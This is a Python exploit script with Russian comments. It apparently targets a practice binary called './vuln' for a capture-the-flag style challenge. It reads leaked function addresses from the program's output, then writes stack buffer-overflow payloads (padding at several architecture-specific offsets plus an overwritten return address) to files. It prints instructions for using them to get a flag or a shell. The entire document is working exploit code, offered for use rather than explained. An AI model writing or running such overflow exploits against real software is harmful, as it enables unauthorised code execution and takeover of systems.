#!/usr/bin/env python3
import struct
import subprocess
import re
import sys
import platform

# Определяем архитектуру системы
is_64bit = sys.maxsize > 2**32
architecture = platform.machine()
print(f"[*] Архитектура: {architecture} ({'64-bit' if is_64bit else '32-bit'})")

def get_function_addresses():
    """Получает адреса функций из вывода программы"""
    try:
        print("[*] Запуск программы для получения адресов...")
        # Запускаем программу и быстро вводим короткую строку для безопасного завершения
        proc = subprocess.Popen(
            ["./vuln"], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        output, _ = proc.communicate(input="exit\n", timeout=1)
        
        # Ищем адреса в выводе
        secret_match = re.search(r"secret function: (0x[0-9a-f]+)", output)
        another_match = re.search(r"another_secret function: (0x[0-9a-f]+)", output)
        
        if secret_match and another_match:
            secret_addr = int(secret_match.group(1), 16)
            another_addr = int(another_match.group(1), 16)
            print(f"[+] Адрес secret: 0x{secret_addr:x}")
            print(f"[+] Адрес another_secret: 0x{another_addr:x}")
            return secret_addr, another_addr
        else:
            print("[-] Не удалось найти адреса функций")
            print(f"Вывод программы: {output}")
            return None, None
    except Exception as e:
        print(f"[-] Ошибка при получении адресов: {e}")
        return None, None

def create_exploit(target_addr, offsets, output_file="exploit_input"):
    """Создает несколько вариантов эксплойта с разными смещениями"""
    print(f"[*] Создание эксплойтов для адреса 0x{target_addr:x}...")
    
    for i, offset in enumerate(offsets):
        # Создаем полезную нагрузку
        payload = b"A" * offset
        
        # Добавляем адрес в соответствии с архитектурой (32 или 64 бит)
        if is_64bit:
            payload += struct.pack("<Q", target_addr)  # 8 байт для 64-битного адреса
        else:
            payload += struct.pack("<I", target_addr)  # 4 байта для 32-битного адреса
        
        # Добавляем маркер для идентификации успешного эксплойта
        filename = f"{output_file}_{offset}"
        
        # Записываем полезную нагрузку в файл
        with open(filename, "wb") as f:
            f.write(payload)
        
        print(f"[+] Эксплойт {i+1} создан с offset={offset}: {filename}")
    
    print("[+] Для запуска используйте: ./vuln < exploit_input_XX")
    print("[+] где XX - значение смещения")

def main():
    # Получаем адреса функций
    secret_addr, another_addr = get_function_addresses()
    
    if not secret_addr or not another_addr:
        print("[-] Не удалось получить адреса функций")
        sys.exit(1)
    
    # Используем разные диапазоны смещений в зависимости от архитектуры
    if architecture.startswith(('aarch64', 'arm64')):  # ARM64
        offsets = [72, 76, 80, 84, 88, 92, 96]
    elif architecture.startswith(('x86_64', 'amd64')):  # x86_64
        offsets = [64, 68, 72, 76, 80, 84, 88]
    else:  # Другие архитектуры
        offsets = [64, 72, 80, 88, 96, 104, 112, 120]
    
    # Создаем эксплойт для функции another_secret
    create_exploit(another_addr, offsets)
    
    # Также создаем эксплойт для функции secret
    create_exploit(secret_addr, offsets, "exploit_shell_input")
    
    print("\n[*] Инструкции по использованию:")
    print("1. Для получения флага запустите: ./vuln < exploit_input_XX")
    print("2. Для получения оболочки запустите: ./vuln < exploit_shell_input_XX")
    print("   где XX - значение смещения")
    print("\n[*] Возможно, потребуется попробовать несколько значений смещения")

if __name__ == "__main__":
    main() 